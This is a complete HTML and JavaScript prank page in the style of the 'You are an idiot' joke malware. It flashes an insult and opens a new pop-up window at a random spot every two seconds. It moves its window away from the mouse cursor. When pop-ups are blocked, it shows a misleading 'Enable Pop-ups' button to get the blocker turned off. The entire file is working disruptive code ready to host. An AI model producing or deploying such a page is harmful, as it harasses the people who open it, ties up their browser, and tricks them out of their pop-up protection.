<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: yellow;
      font-family: Arial, sans-serif;
      text-align: center;
      font-size: 3rem;
      font-weight: bold;
      animation: blink 0.5s infinite alternate;
    }
    @keyframes blink {
      from { opacity: 1; }
      to { opacity: 0.3; }
    }
    #enable-popup-btn {
      display: none;
      background-color: yellow;
      color: black;
      border: none;
      padding: 20px;
      font-size: 1.5rem;
      cursor: pointer;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div>You are an idiot!</div>
  <button id="enable-popup-btn" onclick="enablePopups()">Enable Pop-ups</button>

  <script>
    // Detect if pop-ups are blocked
    function checkPopupBlocked() {
      const testWindow = window.open('', '', 'width=1,height=1');
      if (!testWindow || testWindow.closed) {
        document.getElementById('enable-popup-btn').style.display = 'block';  // Show the button if pop-ups are blocked
      } else {
        testWindow.close();  // Close the test window if pop-ups are allowed
      }
    }

    // Enable pop-ups manually by opening a new window
    function enablePopups() {
      window.open('popup.html', '_blank', 'width=400,height=300');
    }

    // Function to make the window "run away" from the mouse
    document.addEventListener('mousemove', (event) => {
      const distancia = 100;
      const ventanaX = window.screenX + window.outerWidth / 2;
      const ventanaY = window.screenY + window.outerHeight / 2;

      if (Math.abs(event.screenX - ventanaX) < distancia && Math.abs(event.screenY - ventanaY) < distancia) {
        const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
        const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
        window.moveTo(nuevaX, nuevaY);
      }
    });

    // Function to open more windows at random positions
    function abrirMasVentanas() {
      const ventanaAncho = 400;
      const ventanaAlto = 300;

      // Calculate a random position on the screen
      const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - ventanaAncho));
      const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - ventanaAlto));

      // Open the new window at the random position
      const win = window.open('popup.html', '_blank', `width=${ventanaAncho},height=${ventanaAlto},left=${nuevaX},top=${nuevaY}`);
      if (win) {
        win.blur();
      }
    }

    // Check if pop-ups are blocked when the page loads
    checkPopupBlocked();

    // Set up the interval to open more windows
    setInterval(abrirMasVentanas, 2000);  
  </script>
</body>
</html>
